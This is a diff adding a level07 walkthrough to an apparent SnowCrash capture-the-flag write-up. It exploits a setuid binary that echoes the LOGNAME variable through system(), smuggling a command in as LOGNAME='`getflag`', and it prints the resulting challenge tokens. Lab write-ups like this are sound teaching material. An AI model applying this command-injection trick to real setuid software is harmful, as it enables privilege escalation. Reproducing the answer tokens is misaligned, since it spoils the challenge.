@@ -461,3 +461,36 @@ PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboi
 level06@SnowCrash:~$ su level07
 Password:wiok45aaoguiboiki2tuin6ub
 ```
+## level07
+Executable prints level07
+```
+level07@SnowCrash:~$ file level07 
+level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
+```
+**strings level07** shows a line with **/bin/echo %s**
+```
+level07@SnowCrash:~$ ls -l level07 
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+```
+*SUID yay*, **binary ninja**, ouh it actually displays the content of an env variable *LOGNAME*
+```
+mov     dword [esp], data_8048680  {"LOGNAME"}
+call    getenv
+```
+*displayed using /bin/echo and calling the system() function*
+```
+level07@SnowCrash:~$ LOGNAME=`getflag`
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token :
+sh: 2: Syntax error: ")" unexpected
+```
+*I'm stupid and lazy*
+```
+level07@SnowCrash:~$ LOGNAME='`getflag`'
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+level07@SnowCrash:~$ su level08
+Password:fiumuikeil55xe9cu4dood66h
+```
+*yay, stupid shell*
+## level09
